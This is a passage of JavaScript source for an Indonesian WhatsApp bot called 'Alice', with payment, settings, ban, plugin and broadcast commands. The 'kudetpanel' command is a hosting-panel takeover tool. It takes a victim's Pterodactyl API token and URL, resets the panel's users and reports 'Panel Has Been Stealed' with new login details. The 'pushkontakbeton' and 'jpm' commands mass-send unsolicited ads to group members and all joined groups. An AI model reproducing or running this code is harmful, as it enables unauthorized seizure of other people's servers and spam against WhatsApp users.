        return reply(`Error! Silahkan Masukkan link group whatsapp\nExample: ${XyrooRynzz} https://chat.whatsapp.com`);
    }
    let requestAmount = 25000;
    let feeServer = Math.floor(Math.random() * 11);
    let nominal = requestAmount + feeServer;

    try {
        const pay = await createQRIS(nominal, `${orkut.codeqr}`);
        const expirationTime = new Date(pay.expirationTime);
        const timeLeft = Math.max(0, Math.floor((expirationTime - new Date()) / 60000));
        const currentTime = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
        const expireTimeJakarta = new Date(currentTime.getTime() + timeLeft * 60000);
        const hours = expireTimeJakarta.getHours().toString().padStart(2, '0');
        const minutes = expireTimeJakarta.getMinutes().toString().padStart(2, '0');
        const formattedTime = `${hours}:${minutes}`;

        const paymentInfo = `*PEMBAYARAN BUY SEWA 2 Month*\n\nMetode: e-Wallet (QRIS)\nReferensi: #${pay.transactionId}\nBerlaku hingga: ${timeLeft} menit (${formattedTime})\nBiaya Sewa Grup: ${formatmoney(requestAmount)}\nFee Server: ${formatmoney(feeServer)}\nTotal Pembayaran: ${formatmoney(nominal)}\n\nSilakan scan QRIS di atas untuk melanjutkan pembayaran.`;
        const qrisMessage = await Alice.sendMessage(from, { image: { url: pay.qrImageUrl }, caption: paymentInfo }, { quoted: m });

        let isTransactionComplete = false;

        while (!isTransactionComplete) {
            try {
                const merchant = `${orkut.merchant}`;
                const token = `${orkut.key}`;
                const response = await checkStatus(merchant, token);

                if (response && parseInt(response.amount) === parseInt(nominal)) {
                    isTransactionComplete = true;

                    if (qrisMessage.key) {
                        await Alice.sendMessage(from, { delete: qrisMessage.key });
                        reply(`Pembayaran berhasil. Bot akan segera masuk ke grup Anda.`);

                        const result = args[0].split('https://chat.whatsapp.com/')[1];
                        await Alice.groupAcceptInvite(result)
                            .then(() => reply('Berhasil bergabung ke grup!'))
                            .catch(() => reply('Gagal bergabung ke grup, pastikan link valid atau bot diizinkan bergabung.'));
                    }
                }
            } catch (error) {
                console.error('Error memeriksa status transaksi:', error);
            }

            if (!isTransactionComplete) {
                await new Promise(resolve => setTimeout(resolve, 10000));
            }
        }
    } catch (error) {
        console.error('Error membuat QRIS atau memeriksa status:', error);
        reply('Gagal membuat atau memeriksa pembayaran.');
    }
}
break;

case 'buysewa-permanen': {
    if (!args[0]) {
        return reply(`Error! Silahkan Masukkan link group whatsapp\nExample: ${XyrooRynzz} https://chat.whatsapp.com`);
    }
    let requestAmount = 35000;
    let feeServer = Math.floor(Math.random() * 11);
    let nominal = requestAmount + feeServer;

    try {
        const pay = await createQRIS(nominal, `${orkut.codeqr}`);
        const expirationTime = new Date(pay.expirationTime);
        const timeLeft = Math.max(0, Math.floor((expirationTime - new Date()) / 60000));
        const currentTime = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
        const expireTimeJakarta = new Date(currentTime.getTime() + timeLeft * 60000);
        const hours = expireTimeJakarta.getHours().toString().padStart(2, '0');
        const minutes = expireTimeJakarta.getMinutes().toString().padStart(2, '0');
        const formattedTime = `${hours}:${minutes}`;

        const paymentInfo = `*PEMBAYARAN BUY SEWA PERMANEN*\n\nMetode: e-Wallet (QRIS)\nReferensi: #${pay.transactionId}\nBerlaku hingga: ${timeLeft} menit (${formattedTime})\nBiaya Sewa Grup: ${formatmoney(requestAmount)}\nFee Server: ${formatmoney(feeServer)}\nTotal Pembayaran: ${formatmoney(nominal)}\n\nSilakan scan QRIS di atas untuk melanjutkan pembayaran.`;
        const qrisMessage = await Alice.sendMessage(from, { image: { url: pay.qrImageUrl }, caption: paymentInfo }, { quoted: m });

        let isTransactionComplete = false;

        while (!isTransactionComplete) {
            try {
                const merchant = `${orkut.merchant}`;
                const token = `${orkut.key}`;
                const response = await checkStatus(merchant, token);

                if (response && parseInt(response.amount) === parseInt(nominal)) {
                    isTransactionComplete = true;

                    if (qrisMessage.key) {
                        await Alice.sendMessage(from, { delete: qrisMessage.key });
                        reply(`Pembayaran berhasil. Bot akan segera masuk ke grup Anda.`);

                        const result = args[0].split('https://chat.whatsapp.com/')[1];
                        await Alice.groupAcceptInvite(result)
                            .then(() => reply('Berhasil bergabung ke grup!'))
                            .catch(() => reply('Gagal bergabung ke grup, pastikan link valid atau bot diizinkan bergabung.'));
                    }
                }
            } catch (error) {
                console.error('Error memeriksa status transaksi:', error);
            }

            if (!isTransactionComplete) {
                await new Promise(resolve => setTimeout(resolve, 10000));
            }
        }
    } catch (error) {
        console.error('Error membuat QRIS atau memeriksa status:', error);
        reply('Gagal membuat atau memeriksa pembayaran.');
    }
}
break;
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Gateway Fitur Batas!
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Owner Fitur
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
case 'setting':
case 'setbot': 
case 'alice': 
case 'bot':{
if(!isOwner) return Xowner()
const caption = `Silahkan Dipilih Tuan`;
let sections = [
{
highlight_label: 'Alice Self',
rows: [{
title: 'Nyalakan self',
id: `${Xyroo}self`
}]
},
{
highlight_label: 'Alice Public',
rows: [{
title: 'Matikan Self',
id: `${Xyroo}public`
}]
},
{
highlight_label: 'Alice Onlygroup',
rows: [{
title: 'Nyalakan Onlygroup',
id: `${Xyroo}onlygc on`
}]
},
{
highlight_label: 'Alice Onlygroup',
rows: [{
title: 'Matikan Onlygroup',
id: `${Xyroo}onlygc off`
}]
},
{
highlight_label: 'Alice Anticall',
rows: [{
title: 'Nyalakan Anticall',
id: `${Xyroo}anticall on`
}]
},
{
highlight_label: 'Alice Anticall',
rows: [{
title: 'Matikan Anticall',
id: `${Xyroo}anticall off`
}]
},
{
highlight_label: 'Alice Autobio',
rows: [{
title: 'Nyalakan Autobio',
id: `${Xyroo}autobio on`
}]
},
{
highlight_label: 'Alice Autobio',
rows: [{
title: 'Matikan Autobio',
id: `${Xyroo}autobio off`
}]
},
{
highlight_label: 'Alice Autoread',
rows: [{
title: 'Nyalakan Autoread',
id: `${Xyroo}autoread on`
}]
},
{
highlight_label: 'Alice Autoread',
rows: [{
title: 'Matikan Autoread',
id: `${Xyroo}autoread off`
}]
},
{
highlight_label: 'Alice Setprefix',
rows: [{
title: 'Setprefix',
id: `${Xyroo}aliceprefix`
}]
}]

let listMessage = {
    title: `Setting ${botname}`, 
    sections
}


let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterName: author,
 newsletterJid: idch,
 serverMessageId: 143
},
 businessMessageForwardInfo: { businessOwnerJid: Alice.decodeJid(Alice.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: caption
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: packname
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `Haii developer, mau set apa di aku?`,
 subtitle: "",
 hasMediaAttachment: true,
 ...(await prepareWAMessageMedia({ image: { url: thumb } }, { upload: Alice.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
 }
 ],
 })
 })
 }
 }
}, {})

if (!text) await Alice.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break 

case 'setprefix':
case 'aliceprefix': 
case 'prefixalice':{
if(!isOwner) return Xowner()
const caption = `Silahkan Dipilih Tuan`;
let sections = [
{
highlight_label: 'Alice One Prefix',
rows: [{
title: 'One Prefix',
id: `${Xyroo}mmk one`
}]
},
{
highlight_label: 'Alice No Prefix',
rows: [{
title: 'No Prefix',
id: `${Xyroo}mmk no`
}]
},
{
highlight_label: 'Alice All Prefix',
rows: [{
title: 'All Prefix',
id: `${Xyroo}mmk all`
}]
}]

let listMessage = {
    title: `Setting Prefix`, 
    sections
}


let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterName: author,
 newsletterJid: idch,
 serverMessageId: 143
},
 businessMessageForwardInfo: { businessOwnerJid: Alice.decodeJid(Alice.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: caption
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: packname
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `Haii developer, mau set apa di aku?`,
 subtitle: "",
 hasMediaAttachment: true,
 ...(await prepareWAMessageMedia({ image: { url: thumb } }, { upload: Alice.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
 }
 ],
 })
 })
 }
 }
}, {})

if (!text) await Alice.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break 

       case "banuser":
       case "banneduser":{
           if (!isOwner) return Xowner()
           if (!text) return ReplyRynzz("tag atau reply yang mau di banned");
           let who;
           try {
               if (m.isGroup)
                   who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender;
           } catch (err) {
               if (m.isGroup) who = text + "@s.whatsapp.net";
           }
           if (!who) return ReplyRynzz("tag atau reply yang mau di banned");
           const isBen = user_ban.includes(who);
           if (isBen) return ReplyRynzz(`${isBen} telah di banned !!`);
           user_ban.push(who);
           fs.writeFileSync("./AliceDatabase/banned.json", JSON.stringify(user_ban, 2, null));
           await sleep(500);
           ReplyRynzz(who + "\npftt, di bann aowkaowwk");
       }
       break;                
       case "unbanneduser":
       case "unbanuser":{
           if (!isOwner) return Xowner()
           if (!text) return ReplyRynzz("tag atau reply yang mau di unbanned");          
           let whe;
           try {
               if (m.isGroup)
                   whe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender;
           } catch (err) {
               if (m.isGroup) whe = text + "@s.whatsapp.net";
           }
           if (!whe) return ReplyRynzz("tag atau reply nomor yang mau di unban");
           user_ban.splice(whe, 1);
           fs.writeFileSync("./AliceDatabase/banned.json", JSON.stringify(user_ban, 2, null));
           await sleep(500);
           ReplyRynzz(whe + "\nsukses unban");
       }
       break;
                
       case "listbanuser":
       case "listbanned":{
           if (!isOwner) return Xowner()
           var textban = `list user yang terbanned di database : *${user_ban.length}*`;
           await Alice.sendMessage(m.chat, {
               text: textban,
               contextInfo: {
                   externalAdReply: {
                       title: `${ownername}`,
                       body: "",
                       thumbnailUrl: thumb,
                       sourceUrl: xtele,
                       mediaType: 1,
                       renderLargerThumbnail: true,
                   }
               }
           }, { quoted: m });
       }
       break;

case 'kudetpanel':{
    if (!isOwner) return Xowner()
    generateRandomPassword()
    const permen = text.split('|').map(arg => arg.trim());
    const apiKey = permen[0];
    const panelUrl = permen[1];
    const userIdToKeep = permen[2];

    if (permen.length < 3) {
        ReplyRynzz(`*Kudeta Panel Ambil Token Plta Dulu Sama Lihat User ID Akun mu agar tidak ikut kehapus, Setelah Kudet Dimohon Kill SSH 42000 Detik = 12 Jam*\n\n\`\`\`Example Use: .pkudet plta|link|userid\`\`\``);
        return;
    }

    ReplyRynzz(`\`\`\`Processing...\`\`\`\n\`Target:\` ${panelUrl}\n\`Keep ID:\` ${userIdToKeep}\n\`Token:\` ${apiKey}\n\nIf The Stealer Finished Data Will Be Send To You`);

    try {
        const progress = await PermenReset(apiKey, panelUrl, userIdToKeep);
        ReplyRynzz(progress);
        const thumb = `${thumb}`;
        const resultn = `Panel Stealer Access By ${ownername}
        \`Target:\` ${panelUrl}
        \`Keep ID:\` ${userIdToKeep}
        
        \`New User:\` x
        \`Mail:\` x@reset.com
        \`Password:\` ${passwordaseli}`;
        Alice.sendMessage(m.sender, {
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `Panel Has Been Stealed`,
                    body: `New Details`,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnailUrl: thumb,
                    sourceUrl: yt
                }
            }, 
            text: resultn
        }, { quoted: m });
        
    } catch (error) {
        replh(error.message);
    }
}
break

case 'restart':
if (!isOwner) return Xowner()
ReplyRynzz(`restarting ${global.botname}`)
ReplyRynzz(`Done ✅`)
await sleep(3000)
process.exit()
break

  case "upsaluran":
  case "upch":{
      if (!isOwner) return Xowner()
      await reaction(m.chat, "⏳")
      await sleep(3000)
      await reaction(m.chat, "⌛")
      Alice.sendMessage(`${global.idchtesti}`,{ 
          audio : await quoted.download(),
          mimetype: 'audio/mp4',
          ptt: true
      })
      await sleep(2000)
      await reaction(m.chat, "✅")
  }
  break
  
case 'upch-audio': {
      if (!isOwner) return Xowner()
    if (!/video/.test(mime) && !/audio/.test(mime)) return ReplyRynzz(`Use ${XyrooRynzz} Judul Lagu|Terserah\n\nExample ${XyrooRynzz} Mungkin | Kita Sad Dulu`);

    Alice.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
    ngawi = text.split("|")[0];
    jomokck = text.split("|")[1];
    await sleep(6000);

    Alice.sendMessage(`${global.idchtesti}`, {
        audio: await quoted.download(),
        mimetype: 'audio/mp4',
        ptt: true,
        contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: idch,
                serverMessageId: 20,
                newsletterName: botname
            },
            externalAdReply: {
                title: ngawi,
                body: jomokck,
                thumbnailUrl: thumb,
                sourceUrl: null,
                mediaType: 1
            }
        }
    });

    await sleep(2000);
    Alice.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
}
break

case 'uptesti': {
      if (!isOwner) return Xowner()
    if (!/video/.test(mime) && !/image/.test(mime)) return ReplyRynzz(`Reply Image with ${XyrooRynzz} Tulis Caption-nya`);

    Alice.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
    media = await Alice.downloadAndSaveMediaMessage(quoted);
    let anu = await uploadToCatbox(media);

    Alice.sendMessage(`${global.idchtesti}`, {
        image: {
            url: `${util.format(anu)}`
        },
        caption: text,
        contextInfo: {
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: idch,
                serverMessageId: 20,
                newsletterName: botname
            },
            externalAdReply: {
                title: "",
                body: ownername,
                thumbnailUrl: thumb,
                sourceUrl: null,
                mediaType: 1
            },
        }
    });

    await sleep(2000);
    Alice.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
}
break
case 'alicebackup': {
    if (!isOwner) return Xowner()
    const ls = execSync("ls").toString().split("\n").filter(
        (pe) =>           
        pe != "node_modules" &&   
        pe != "AliceSessions" &&
        pe != "package-lock.json" &&  
        pe != "yarn.lock" &&
        pe != "tmp" &&
        pe != ""
    );

    execSync(`zip -r update.zip ${ls.join(" ")}`);
    ReplyRynzz(`File Sc Sudah Terkirim Ke Private Chat √`)
    await Alice.sendMessage(m.chat, {
        document: fs.readFileSync("./update.zip"),   
        fileName: "AliceeUpdatee.zip",
        mimetype: "application/zip",
        caption: `Alice Update ${version}`,
        jpegThumbnail: fs.readFileSync('./AliceMedia/image/Alice.jpg')
    }, { quoted: m });
    execSync("rm -rf update.zip");
}
break
case 'addplugins':{
if (!isOwner) return Xowner()
if (!q.includes("|")) return ReplyRynzz(`Add input, *☘️ Example :* \n\n*${XyrooRynzz} name|category|content*`)
const [
pluginName,
category, ...pluginContent
] = q.split("|")
const pluginDirPath = path.join(path.resolve(__dirname, './AlicePlugins', category))
const pluginFilePath = path.join(pluginDirPath, pluginName + ".js")
if (!q.includes("|") || pluginContent.length === 0 || fs.existsSync(pluginFilePath)) return
if (!fs.existsSync(pluginDirPath)) fs.mkdirSync(pluginDirPath, {
recursive: true
})
fs.writeFileSync(pluginFilePath, pluginContent.join('|'))
await ReplyRynzz(`A new plugin has been created in ${pluginFilePath}.`)
}
break
case 'editplugins': {
if (!isOwner) return Xowner()
if (!q.includes("|")) return reply (`Add Input, *☘️ Example :* *${XyrooRynzz} thisplug|newcontent*`)
let [mypler, ...rest] = q.split("|")
let mypenis = rest.join("|")
let pluginsDirect = path.resolve(__dirname, './AlicePlugins')
let plugins = loadPlugins(pluginsDirect)
for (const plugin of plugins) {
if (plugin.command.includes(mypler)) {
let filePath = plugin.filePath
fs.writeFileSync(filePath, mypenis)
await ReplyRynzz(`The plugin in ${filePath} has been replaced`)
return
}
}
await ReplyRynzz(`Plugin with command '${mypler}' not found`)
}
break
case 'delplugins': {
if (!isOwner) return Xowner()
if (!q) return ReplyRynzz(`Please provide the command name of the plugin you want to remove. *☘️ Example :* \n\n*${XyrooRynzz} thisplug*`)
let pluginsDirect = path.resolve(__dirname, './AlicePlugins')
let plugins = loadPlugins(pluginsDirect)
for (const plugin of plugins) {
if (plugin.command.includes(q)) {
let filePath = plugin.filePath
fs.unlinkSync(filePath)
await ReplyRynzz(`The plugin in ${filePath} has been removed.`)
return
}
}
await ReplyRynzz(`Plugin with command '${q}' not found.`)
}
break
case 'getplugins': {
if (!isOwner) return Xowner()
if (!q) return ReplyRynzz(`Add Input, *☘️ Example :* \n\n*${XyrooRynzz} ryocakep*`)
let pluginsDirect = path.resolve(__dirname, './AlicePlugins')
let plugin = loadPlugins(pluginsDirect).find(p => p.command.includes(q))
if (!plugin) return ReplyRynzz(`Plugin with command '${q}' not found.`)
await Alice.sendMessage(m.chat, {
document: fs.readFileSync(plugin.filePath),
fileName: path.basename(plugin.filePath),
mimetype: '*/*'
}, {
quoted: m
})
await ReplyRynzz(`Successfully retrieved plugin '${q}', plugin has been submitted.`)
}
break

case 'setimgmenu': {
if (!isOwner) return Xowner()
if (!/image/.test(mime)) return ReplyRynzz('reply fotonya')
await Alice.downloadAndSaveMediaMessage(qmsg, "./AliceMedia/image/Alice.jpg", false)
await ReplyRynzz("Berhasil mengganti image menu ✅")
}
break

case 'setimgpng': {
if (!isOwner) return Xowner()
if (!/image/.test(mime)) return ReplyRynzz('reply fotonya')
await Alice.downloadAndSaveMediaMessage(qmsg, "./AliceMedia/image/Alice.png", false)
await ReplyRynzz("Berhasil mengganti image png")
}
break

case "out": case "leave2": {
if (!isOwner) return Xowner()
let gcall = await Object.values(await Alice.groupFetchAllParticipating().catch(_=> null))
let num = []
let listgc = `*Contoh Cara Penggunaan :*\nKetik *out* Nomor Grupnya\n\n*List Semua Grup Chat :*\n\n`
await gcall.forEach((u, i) => {
num.push(i)
listgc += ` *Nomor Grup => ${i+1}*\n*• Nama :* ${u.subject}\n*• ID :* ${u.id}\n*• Total Member :* ${u.participants.length} Member\n*• Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n*• Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
if (!args[0]) {
ReplyRynzz(listgc)
} else if (args[0]) {
if (!num.includes(Number(args[0]) - 1)) return ReplyRynzz("Grup tidak ditemukan")
let leav = Number(args[0]) - 1
await ReplyRynzz(`Berhasil Keluar Dari Grup :\n*${gcall[leav].subject}*`)
await Alice.groupLeave(`${gcall[leav].id}`)
}}
break

case 'addchangelog': case 'addlog': {
      if (!isOwner) return Xowner()
      if (!text) return ReplyRynzz(`Usage: ${Xyroo}addchangelog <text>`)
      changelogs.unshift(`${new Date().toDateString()} - ${text}`)
      global.db.data.changelog = changelogs
      ReplyRynzz('Changelog Berhasil Di Tambahkan 🔑')
      }
      break
      
    case 'delchangelog': case 'dlog': {
      if (!isOwner) return Xowner()
      if (!text) return ReplyRynzz(`Usage: ${Xyroo}rchangelog <text>`)
      let index = changelogs.findIndex(changelog => changelog.includes(text))
      if (index === -1) return ReplyRynzz('Changelog not found')
      changelogs.splice(index, 1)
      global.db.data.changelog = changelogs
      ReplyRynzz('Changelog Berhasil Dihapus 🔥')
      }
      break

case 'changelog':
    case 'log': {
      if (!changelogs.length) return ReplyRynzz('There are no changelogs yet')
      caption = changelogs.map(changelog => {
        let [date, ...items] = changelog.split(' - ')
        return `☀️ ${date}\n${items.map(item => `  📜 ${item}`).join('\n')}`
      }).join('\n\n')
Alice.sendMessage(m.chat, {
    text: caption,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: false,
        title: `Changelog ${botname}`,
        body: `${global.wm}`,
        thumbnailUrl: thumb,
        sourceUrl: channel,
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
      break

case 'pushkontakbeton': {
if (!isOwner) return Xowner()
if (!text) return ReplyRynzz("idgrup|pesan|teksdibutton")
if (!text.split("|")) return ReplyRynzz("idgrup|pesan|teksdibutton")
const [idgc, pes, peszie] = text.split("|")
const teks = pes
const tekszie = peszie
const jidawal = m.chat
const data = await Alice.groupMetadata(idgc)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await ReplyRynzz(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + `FN:${ownername}\n`
            + 'ORG:Developer;\n'
            + `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
            + 'END:VCARD'

let imgscs = await prepareWAMessageMedia({ image: fs.readFileSync("./AliceMedia/image/Alice.jpg") }, { upload: Alice.waUploadToServer })

const msgii = await generateWAMessageFromContent(mem, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: teks
}), 

contextInfo: {
isForwarded: true, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `${ownername}`, newsletterJid: idch }, 
mentionedJid: [global.owner+"@s.whatsapp.net", m.sender]
}, 

carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: tekszie, 
hasMediaAttachment: true,
...imgscs
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
name: "single_select",
buttonParamsJson:
`{
  title": "List Produk",
  "sections": [
    {
      "title": "",
      "rows": [
        {
          "header": "Script Alice Asistent",
          "title": "© XyrooRynzz",
          "description": "",
          "id": ""
        },
        {
          "header": "Panel Pterodactyl Private𝗹",
          "title": "© XyrooRynzz",
          "description": "",
          "id": ""
        }
]}
]}`
},
{
name: "quick_reply",
buttonParamsJson: `{\"display_text\":\"Done Save\",menu\"id\":\"\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"https://wa.me/6281543496975?text=buy+sc+Alice+bang+Xyroo\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {quoted: null})
await Alice.relayMessage(mem, msgii.message, {messageId: msgii.key.id})
await sleep(global.delayPushkontak)
}}

await Alice.sendMessage(jidawal, {text: `Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

case 'jpm': case 'post': case 'pushcontactgc': {
if (!isOwner) return ReplyRynzz("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
if (!text) return ReplyRynzz(`*Incorrect Usage Please Use Like This*\n${XyrooRynzz} text|pause\n\nReply Image To Send Images to All Groups\nFor a pause, 1000 = 1 second\n\nExample: ${XyrooRynzz} hello|9000`)
await ReplyRynzz(`In progress...`)
let getGroups = await Alice.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await Alice.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await Alice.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
await Alice.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await Alice.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
ReplyRynzz(`Success`)
}
break

case 'upstatuswa':
case 'upstatus':
case 'upsw': {
    let argsText = text.split(',').map(a => a.trim())
    if (argsText.length < 2) return ReplyRynzz(`Contoh: ${XyrooRynzz} idgrup, teks`)

    let target = argsText[0]
    let caption = argsText.slice(1).join(',')

    if (!quoted) return ReplyRynzz(`Kutip pesan seperti gambar, video, atau audio dengan caption ${XyrooRynzz}`)

    if (quoted.mtype === "audioMessage") {
        let audioData = await quoted.download()
        Alice.sendStatusMention(
            { audio: audioData, mimetype: 'audio/mp4', ptt: true },
            [target]
        )
    }

    if (quoted.mtype === "imageMessage") {
        let imageData = await quoted.download()
        Alice.sendStatusMention(
            { image: imageData, caption: caption || '' },
            [target]
        )
    }

    if (quoted.mtype === "videoMessage") {
        let videoData = await quoted.download()
        Alice.sendStatusMention(
            { video: videoData, caption: caption || '' },
            [target]
        )
    }
    ReplyRynzz('Sukses mengirim status mention!')
}
break

            case 'statustext': 
            case 'upswtext':
            case 'upswteks': {
               if (!isOwner) return Xowner()
               if (!q) return ReplyRynzz('Text?')
               await Alice.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FF000000', font: 3, statusJidList: Object.keys(global.db.data.users) })
               ReplyRynzz('Succes')
            }
            break
            case 'statusvideo':
            case 'upswvideo': {
               if (!isOwner) return Xowner()
               if (/video/.test(mime)) {
                  var videosw = await Alice.downloadAndSaveMediaMessage(quoted)
                  await Alice.sendMessage('status@broadcast', {
                     video: {
                        url: videosw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.data.users) })
                  await ReplyRynzz('Succes')
               } else {
                  ReplyRynzz('Reply to video')
               }
            }
            break
            case 'statusaudio':
            case 'upswaudio': {
               if (!isOwner) return Xowner()
               if (/audio/.test(mime)) {
                  var audiosw = await Alice.downloadAndSaveMediaMessage(quoted)
                  await Alice.sendMessage('status@broadcast', {
                     audio: {
                        url: audiosw
                     },
                     mimetype: 'audio/mp4',
                     ptt: true
                  }, {
                     backgroundColor: '#FF000000',
                     statusJidList: Object.keys(global.db.data.users)
                  })
                  await ReplyRynzz('Succes')
               } else {
                  ReplyRynzz('Reply to audio')
               }
            }
            break                        
            case 'statusimg':
            case 'statusimage':
            case 'upswimg': {
               if (!isOwner) return Xowner()
               if (/image/.test(mime)) {
                  var imagesw = await Alice.downloadAndSaveMediaMessage(quoted)
                  await Alice.sendMessage('status@broadcast', {
                     image: {
                        url: imagesw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.data.users)})
                  await ReplyRynzz('Succes')
               } else {
                  ReplyRynzz('Reply to image')
               }
            }
            break

case 'getfunction': {
if (!isOwner) return Xowner() 
if (!text) return ReplyRynzz(`Contoh: ${XyrooRynzz} functionName`);
const isValidFunctionName = (name) => /^[a-zA-Z_$][0-9a-zA-Z_$]*$/.test(name);
const getFunction = (functionName) => {
if (!isValidFunctionName(functionName)) return ReplyRynzz(`Nama fungsi tidak valid: ${functionName}`);
try {
const fileContent = fs.readFileSync("./Alice.js", "utf8");

const functionRegex = new RegExp(`function\\s+${functionName}\\s*\\([^)]*\\)\\s*{`, "g");
const match = functionRegex.exec(fileContent);
if (!match) return ReplyRynzz(`Fungsi ${functionName} tidak ditemukan`);

const functionStart = match.index;
let braceCount = 0;
let inString = false;
let inComment = false;
let currentChar, prevChar;
for (let i = functionStart; i < fileContent.length; i++) {
currentChar = fileContent[i];
if (prevChar === '/' && currentChar === '*') inComment = true;
if (prevChar === '*' && currentChar === '/') inComment = false;
if (!inComment) {
if (currentChar === '"' || currentChar === "'" || currentChar === '`') inString = !inString;
if (!inString) {
if (currentChar === '{') braceCount++;
if (currentChar === '}') braceCount--;
}}
if (braceCount === 0 && currentChar === '}') {
const functionEnd = i + 1;
const functionContent = fileContent.slice(functionStart, functionEnd);
return functionContent;
}
prevChar = currentChar;
}} catch (err) {
return ReplyRynzz(`Terjadi kesalahan: ${err.message}`);
}} 
ReplyRynzz(`${getFunction(q)}`);
}
break
case 'delfunc':
case 'delfunction': {
if (!isOwner) return Xowner() 
if (!text) return ReplyRynzz(`Contoh: ${XyrooRynzz} functionName`);
const isValidFunctionName = (name) => /^[a-zA-Z_$][0-9a-zA-Z_$]*$/.test(name);
const deleteFunction = (functionName) => {
if (!isValidFunctionName(functionName)) return ReplyRynzz(`Nama fungsi tidak valid: ${functionName}`);
try {
const fileContent = fs.readFileSync("./Alice.js", "utf8");
const functionRegex = new RegExp(`function\\s+${functionName}\\s*\\([^)]*\\)\\s*{`, "g");
const match = functionRegex.exec(fileContent);
if (!match) return ReplyRynzz(`Fungsi ${functionName} tidak ditemukan`);
const functionStart = match.index;
let braceCount = 0;
let inString = false;
let inComment = false;
let currentChar, prevChar;
let functionEnd;

for (let i = functionStart; i < fileContent.length; i++) {
currentChar = fileContent[i];
if (prevChar === '/' && currentChar === '*') inComment = true;
if (prevChar === '*' && currentChar === '/') inComment = false;
if (!inComment) {
if (currentChar === '"' || currentChar === "'" || currentChar === '`') inString = !inString;
if (!inString) {
if (currentChar === '{') braceCount++;
